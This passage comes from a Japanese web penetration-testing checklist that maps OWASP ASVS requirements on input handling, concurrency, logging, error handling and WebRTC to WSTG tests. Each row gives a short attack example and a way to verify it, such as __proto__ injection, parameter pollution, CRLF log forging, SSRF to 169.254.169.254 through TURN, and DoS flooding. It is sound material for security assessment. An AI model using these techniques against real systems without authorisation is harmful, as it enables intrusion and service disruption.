| V15.3.4 | L2 | 信頼できるヘッダでクライアントIPを扱う | 対応可 | X-Forwarded-For 等の信頼境界確認 | [WSTG-INPV-16](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Incoming_Requests) | X-Forwarded-For偽装でレート制限/監査を回避 | 代理配下でヘッダ改変しアプリが採用/上書きするかを確認 |
| V15.3.5 | L2 | 型安全/厳密比較で型混同を回避 | 範囲外 | 静的解析/ユニットで型検証 | [WSTG-BUSL-01](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/01-Test_Business_Logic_Data_Validation) | `"0e12345"`等の型変換/緩い比較を悪用した検証回避 | 数値/文字列混在や境界ケース入力で比較誤りの再現を確認 |
| V15.3.6 | L2 | JSのプロトタイプ汚染対策(Map/Set等) | 範囲外 | 悪性__proto__/constructor注入試験 | [WSTG-CLNT-02](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/02-Testing_for_JavaScript_Execution) | JSON経由の`__proto__`注入で既定オブジェクトを汚染し任意挙動 | `__proto__`/`constructor`を含む入力でオブジェクト状態/実行経路の変化を観測 |
| V15.3.7 | L2 | HTTPパラメータ汚染防御 | 範囲外 | 同名キー混在/多値処理の検証 | [WSTG-INPV-04](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution) | `a=1&a=2`/区切り混在でサーバ解釈差を悪用しバリデーション回避 | 同名/配列/区切りの組合せ送信でサーバ側の実際の解釈と検証差を特定 |

## V15.4 安全な同時並行性

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :--: | :--: | :-- | :--: | :-- | :-- | :-- | :-- |
| V15.4.1 | L3 | 共有資源はスレッドセーフ型＋同期で保護 | 範囲外 | 競合状態の動的検出/負荷試験 | [WSTG-BUSL-05](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/05-Test_Number_Of_Times_A_Function_Can_Be_Used_Limits) | 同時購入/予約を多重送信し在庫二重確保 | 並列リクエストで重複確保/整合性破綻の再現有無を確認 |
| V15.4.2 | L3 | TOCTOUを避ける原子的操作 | 範囲外 | ファイル/権限チェックの原子性検証 | [WSTG-BUSL-04](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/04-Test_for_Process_Timing) | 検査→使用の間に状態変更してバイパス（価格/権限/在庫） | 時間差/並列で検査-使用の窓を突き整合崩しの再現を確認 |
| V15.4.3 | L3 | ロック秩序/タイムアウトでデッドロック回避 | 範囲外 | ロックグラフ/タイムアウト検証 | [WSTG-BUSL-04](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/04-Test_for_Process_Timing) | 相互待ちが発生する順序で要求を投入しサービス停止を誘発 | 相互待ちパターンを模した連続投入で停止/遅延の再現を観測 |
| V15.4.4 | L3 | 公平な資源配分(スレッドプール等) | 範囲外 | 枯渇/飢餓の検出と緩和確認 | [WSTG-BUSL-07](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/07-Test_Defenses_Against_Application_Misuse) | 低コスト要求を大量投入してスレッドプールを占有し他処理を飢餓化 | 負荷を段階的に増やし優先度/キュー制御で公平性が保てているか観測 |

# V16 セキュリティログ記録とエラー処理

## V16.1 セキュリティログ記録ドキュメント

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :--: | :--: | :-- | :--: | :-- | :-- | :-- | :-- |
| V16.1.1 | L2 | 収集イベント/形式/保存/閲覧権限/保存期間を網羅したログインベントリを文書化 | 対応可 | 設計資料と実装ログの突合、抜け項目の確認 | [WSTG-ERRH-01](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Error_Handling/01-Testing_for_Improper_Error_Handling) | 例外時に詳細情報が露出し攻撃の足掛かり（内部パス/スタック等） | 例外を誘発してレスポンス/ログの露出内容を確認 |

## V16.2 一般的なログ記録

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :--: | :--: | :-- | :--: | :-- | :-- | :-- | :-- |
| V16.2.1 | L2 | 各ログに「いつ/どこ/誰/何」を含む必須メタデータ | 対応可 | 実ログのサンプリング確認（actor, action, object, origin 等） | [WSTG-ERRH-01](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Error_Handling/01-Testing_for_Improper_Error_Handling) | 不正操作後に主体/対象が特定できず追跡不能 | 代表機能で成功/失敗の操作を行い、ログ項目の有無と一貫性を確認 |
| V16.2.2 | L2 | タイムソース同期とUTC/明示TZでの記録 | 範囲外 | 複数ホストの時刻ずれ/タイムゾーン混在検出 | [WSTG-ERRH-01](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Error_Handling/01-Testing_for_Improper_Error_Handling) | タイムスタンプ不整合で攻撃の連鎖が隠蔽 | 複数ノードで同一イベントを発生させ時刻整合を点検 |
| V16.2.3 | L2 | 文書化した対象のみを保存/送信（シャドーログ禁止） | 対応可 | 設計→実運用の差分検出 | [WSTG-CONF-02](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/02-Test_Application_Platform_Configuration) | 未管理ログ出力先に機密が保存され漏洩 | プラットフォーム/アプリ設定を確認し想定外のログ出力を探索 |
| V16.2.4 | L2 | 共通のログ形式に正規化（プロセッサで可読・相関可能） | 対応可 | 形式不一致/欠損フィールドの検出 | [WSTG-CONF-02](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/02-Test_Application_Platform_Configuration) | 形式ばらつきにより検知回避や相関失敗 | 複数コンポーネントのログを収集し必須フィールド/形式の一致を確認 |
| V16.2.5 | L2 | 機密データは非記録/マスク/ハッシュ等、保護レベル準拠 | 対応可 | トークン/PIIの露出スキャン | [WSTG-ERRH-01](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Error_Handling/01-Testing_for_Improper_Error_Handling) | アクセストークンやカード番号が平文でログ出力 | テスト取引で機密値を含む操作を行いログ露出の有無を確認 |

## V16.3 セキュリティイベント

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :--: | :--: | :-- | :--: | :-- | :-- | :-- | :-- |
| V16.3.1 | L2 | 認証の成功/失敗と要素種別を記録 | 対応可 | 認証試行→ログ内容の突合 | [WSTG-ATHN-03](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism) | ブルートフォース/クレデンシャルスタッフィングの痕跡把握不能 | 連続失敗→成功のシナリオを実行し、失敗回数/要素種別の記録有無を確認 |
| V16.3.2 | L2 | 認可失敗を記録（L3は全認可判定の記録） | 対応可 | IDOR/BOLA試験時のログ有無確認 | [WSTG-ATHZ-02](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema) | 権限外アクセス試行を検知できず不正取得が継続 | 他者ID/他テナントIDでのアクセスを行い拒否ログの有無を確認 |
| V16.3.3 | L2 | セキュリティ制御バイパス試行（入力/業務ロジック/自動化）を記録 | 範囲外 | WAF/アプリ側検知イベントの有無 | [WSTG-BUSL-07](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/07-Test_Defenses_Against_Application_Misuse) | フロー省略/順序変更/頻度超過の悪用が未検知 | 仕様外操作（回数超過/順序スキップ）を実施し検知・記録の有無を確認 |
| V16.3.4 | L2 | 予期しないエラーや制御障害（例：TLS失敗）を記録 | 対応可 | エラー誘発→ログ追跡 | [WSTG-ERRH-01](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Error_Handling/01-Testing_for_Improper_Error_Handling) | 外部依存障害時に原因不明で復旧遅延 | 外部接続失敗/タイムアウトを故意発生させ、適切なエラー記録を確認 |

## V16.4 ログ保護

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :--: | :--: | :-- | :--: | :-- | :-- | :-- | :-- |
| V16.4.1 | L2 | ログインジェクション防止（適切エンコード） | 対応可 | 改行/制御文字/テンプレ挿入の挙動確認 | [WSTG-INPV-16](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Incoming_Requests) | `CRLF`混入でログ行を偽装・改竄 | `\r\n`/ヘッダ改変を含む入力を送り、ログ汚染可否を確認 |
| V16.4.2 | L2 | ログのアクセス制御/改竄不可（WORM等） | 範囲外 | 改竄耐性/権限分離の検証 | [WSTG-CONF-09](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission) | 権限過多によりログの削除/改竄 | サーバ/ファイル権限とローテーション先の権限設定を確認 |
| V16.4.3 | L2 | 侵害分離のため外部の分離基盤へ安全転送 | 対応可 | 転送経路の暗号化/再送制御確認 | [WSTG-CRYP-01](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security) | 盗聴可能な平文転送でログ漏洩 | 送信経路のTLS有効性/証明書検証とダウングレード不可を確認 |

## V16.5 エラー処理

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :--: | :--: | :-- | :--: | :-- | :-- | :-- | :-- |
| V16.5.1 | L2 | 例外時は一般メッセージのみを返し内部情報を秘匿 | 対応可 | 例外誘発→レスポンス/ログの情報露出確認 | [WSTG-ERRH-01](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Error_Handling/01-Testing_for_Improper_Error_Handling) | 例外画面にスタックやSQL断片が表示され攻撃に悪用 | 想定外入力/障害を発生させ、ユーザ向け応答の情報量とログ側詳細分離を確認 |
| V16.5.2 | L2 | 外部依存障害でも安全に継続（CB/デグレード） | 範囲外 | 依存先ダウン時の挙動評価 | [WSTG-BUSL-04](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/10-Business_Logic_Testing/04-Test_for_Process_Timing) | 外部API停止で処理が不整合/誤結果で継続 | 依存系を遮断しタイムアウト/代替ルート/一貫したエラー応答を確認 |
| V16.5.3 | L2 | フェイルオープン防止（検証失敗時に処理中止） | 対応可 | バリデーション強制失敗→取引不成立確認 | [WSTG-BUSL-01](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/01-Test_Business_Logic_Data_Validation) | 不正入力時に検証をスキップし処理が成立 | 極端/矛盾入力で業務検証が強制停止するかを確認 |
| V16.5.4 | L3 | 最終手段ハンドラで未処理例外を捕捉・記録 | 範囲外 | プロセス落ち/未捕捉例外のテスト | [WSTG-ERRH-02](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Error_Handling/02-Testing_for_Stack_Traces) | 未捕捉例外でプロセスが落ち情報も記録されない | クラッシュを誘発しスタックトレース/例外記録の有無と機密露出の有無を確認 |

# V17 WebRTC

## V17.1 TURN サーバ

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 対応するWSTG の番号 | 具体的な攻撃例 | 精査方法 |
| :--: | :--: | :-- | :--: | :-- | :--: | :-- | :-- |
| V17.1.1 | L2 | TURNの到達先を予約/特別用途IPへ禁止（IPv4/IPv6） | 対応可 | STUN/TURN設定取得→任意宛先中継試行、特殊レンジ(127.0.0.0/8, RFC1918, 169.254/16, ::1/128 等)への中継可否を検証 | [WSTG-INPV-19](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery) | TURNを介して 169.254.169.254 などのメタデータや内網へ到達（オープンリレー/SSRF化） | TURN Allocate/Permission作成後に特殊レンジ宛のSend/Dataを試行し拒否されることを確認 |
| V17.1.2 | L3 | 多数ポート確保でも枯渇しないレート制御/割当制限 | 範囲外 | 大量アロケート/チャネルBind連続実施で資源枯渇・他ユーザ影響を観測 | [WSTG-BUSL-07](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/07-Test_Defenses_Against_Application_Misuse) | TURN Allocate/ChannelBind を高頻度連打しリレー資源を枯渇させるDoS | 連続Allocate/Bindで失敗率・遅延・上限適用を計測し制限/レート制御の有無を確認 |

## V17.2 メディア

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 対応するWSTG の番号 | 具体的な攻撃例 | 精査方法 |
| :--: | :--: | :-- | :--: | :-- | :--: | :-- | :-- |
| V17.2.1 | L2 | DTLS証明書鍵の管理/保護をポリシー化 | 対応可 | キーマテリアル格納先/ローテーション/アクセス権の確認 | [WSTG-CONF-02](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/02-Test_Application_Platform_Configuration) | 流出したDTLS秘密鍵で中間者/なりすまし | 鍵保管場所/権限/ローテ運用を確認し、鍵の再利用・過剰共有・平文配置の痕跡を特定 |
| V17.2.2 | L2 | 承認済みDTLS暗号/DTLS-SRTP保護プロファイルの採用 | 対応可 | サーバのCipher一覧/プロファイルを握手から確認 | [WSTG-CRYP-01](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security) | 弱い/非推奨DTLS暗号でのネゴシエーション | パケットキャプチャでDTLSハンドシェイクの暗号スイート/プロファイルを確認し弱設定を検出 |
| V17.2.3 | L2 | SRTP認証必須化でRTPインジェクション/DoS防止 | 対応可 | 改竄RTP注入を試行し再生拒否/警告を確認 | [WSTG-CRYP-01](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security) | 認証なし/無効タグのSRTPを混入して音声/映像を乗っ取り | 異常タグ/改竄パケット投入時に破棄されること、復号/再生されないことを確認 |
| V17.2.4 | L2 | 不正SRTPパケット混入時も処理継続（耐性） | 範囲外 | フォーマット不正/リプレイ/古いシーケンス投入の影響評価 | [WSTG-BUSL-07](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/07-Test_Defenses_Against_Application_Misuse) | 異常長/壊れたSRTPを連投し受信側をクラッシュ/ハング | 形式/順序を崩したSRTPを投入しクラッシュ/過負荷・回復性の有無を観測 |
| V17.2.5 | L3 | 正規大量SRTPでもサービス継続（フラッド耐性） | 範囲外 | 送信側を正規でスパイク→遅延/ドロップ/CPU飽和観測 | [WSTG-BUSL-07](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/07-Test_Defenses_Against_Application_Misuse) | 正常な高ビットレート/多ストリームでの輻輳により品質劣化 | 正規トラフィック増大時のドロップ率・遅延・スループットを計測し制御有無を確認 |
| V17.2.6 | L3 | DTLS “ClientHello” Race Condition 脆弱性非影響 | 範囲外 | 既知PoC/同時ハンドシェイク競合試験 | [WSTG-CRYP-01](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security) | 同時ClientHello多重送信でハンドシェイク競合→例外/DoS | 複数同時ハンドシェイクを発生させ、異常終了/再試行/保護実装の挙動を確認 |
| V17.2.7 | L3 | 大量SRTP時も録画機構が継続 | 範囲外 | レコーディング有効時の負荷試験→ファイル整合性確認 | [WSTG-BUSL-07](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/07-Test_Defenses_Against_Application_Misuse) | 高負荷通話＋録画同時で録画欠損/停止 | 負荷下で録画ファイルの連続性/欠損を検証し可用性を評価 |
| V17.2.8 | L3 | DTLS証明書とSRTPフィンガープリント照合/不一致で切断 | 対応可 | SDPのa=fingerprint と実証明書の一致検証→改竄時の切断確認 | [WSTG-CRYP-01](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security) | SDPの`a=fingerprint`を改竄しMITMで異なる証明書を提示 | 改竄SDPで接続し、フィンガープリント不一致時に切断/拒否されることを確認 |

## V17.3 シグナリング

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | 対応するWSTG の番号 | 具体的な攻撃例 | 精査方法 |
| :--: | :--: | :-- | :--: | :-- | :--: | :-- | :-- |
| V17.3.1 | L2 | フラッド下でも正当メッセージ処理継続（レート制限） | 対応可 | 信号面DoS(Offer/Answer/ICE更新乱発)下で成功率/遅延計測 | [WSTG-CLNT-08](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_WebSockets) | WebSocketシグナリングでOffer/ICE更新を高頻度連投しセッション確立を阻害 | シグナリングの連投で成功率/応答遅延/拒否応答を計測し、レート制御やキュー分離を確認 |
| V17.3.2 | L2 | 不正シグナリング入力でも可用性維持（堅牢化） | 対応可 | 異常長/型不整合/境界値/Fuzz投入→クラッシュ/リーク有無 | [WSTG-CLNT-08](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_WebSockets) | 巨大/壊れたJSON/未定義Typeのシグナリングを送信してクラッシュ/例外を誘発 | WebSocket/HTTPシグナリングに対しフェイロードFuzzを実施し、サービス継続性とエラー処理を確認 |
